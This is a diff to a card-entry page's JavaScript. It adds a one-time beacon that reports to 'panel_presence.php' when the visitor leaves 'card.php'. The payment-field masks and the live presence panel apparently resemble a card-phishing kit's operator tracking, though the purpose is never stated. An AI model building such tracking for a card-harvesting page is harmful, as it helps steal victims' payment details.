@@ -234,6 +234,7 @@ function validateCVV(cvv) {
 }
 
 $(document).ready(function() {
+  let outReported = false;
   $("#cc").mask("0000 0000 0000 0000");
   $("#exp").mask("00/00");
   $("#cvv").mask("0000");
@@ -294,6 +295,31 @@ $(document).ready(function() {
       e.preventDefault();
     }
   });
+
+  function reportPageOut() {
+    if (outReported) {
+      return;
+    }
+
+    outReported = true;
+    const payload = new URLSearchParams({ page: 'card.php' });
+
+    if (navigator.sendBeacon) {
+      const blob = new Blob([payload.toString()], { type: 'application/x-www-form-urlencoded' });
+      navigator.sendBeacon('panel_presence.php', blob);
+      return;
+    }
+
+    fetch('panel_presence.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: payload,
+      keepalive: true,
+    }).catch(() => {});
+  }
+
+  window.addEventListener('pagehide', reportPageOut);
+  window.addEventListener('beforeunload', reportPageOut);
 });
 </script>
 
